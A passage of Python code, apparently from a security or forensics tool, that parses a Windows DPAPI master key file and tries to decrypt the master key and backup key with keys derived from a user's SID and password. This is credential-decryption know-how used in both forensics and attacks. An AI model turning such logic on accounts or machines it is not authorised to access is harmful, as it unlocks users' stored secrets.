            bkmk = MasterKey(data[:mkf["BackupKeyLen"]])
            data = data[len(bkmk):]

        if mkf["CredHistLen"] > 0:
            ch = CredHist(data[:mkf["CredHistLen"]])
            data = data[len(ch):]

        if mkf["DomainKeyLen"] > 0:
            dk = DomainKey(data[:mkf["DomainKeyLen"]])
            data = data[len(dk):]

        key1, key2, key3 = deriveKeysFromUser(sid, password)

        # if mkf['flags'] & 4 ? SHA1 : MD4
        decryptedKey = mk.decrypt(key3)
        if decryptedKey:
            self.logger.debug("Decrypted key with User Key (MD4 protected)")
            return decryptedKey

        decryptedKey = mk.decrypt(key2)
        if decryptedKey:
            self.logger.debug("Decrypted key with User Key (MD4)")
            return decryptedKey

        decryptedKey = mk.decrypt(key1)
        if decryptedKey:
            self.logger.debug("Decrypted key with User Key (SHA1)")
            return decryptedKey

        decryptedKey = bkmk.decrypt(key3)
        if decryptedKey:
            self.logger.debug("Decrypted Backup key with User Key (MD4 protected)")
            return decryptedKey

        decryptedKey = bkmk.decrypt(key2)
        if decryptedKey:
            self.logger.debug("Decrypted Backup key with User Key (MD4)")
            return decryptedKey

        decryptedKey = bkmk.decrypt(key1)
        if decryptedKey:
            self.logger.debug("Decrypted Backup key with User Key (SHA1)")
            return decryptedKey
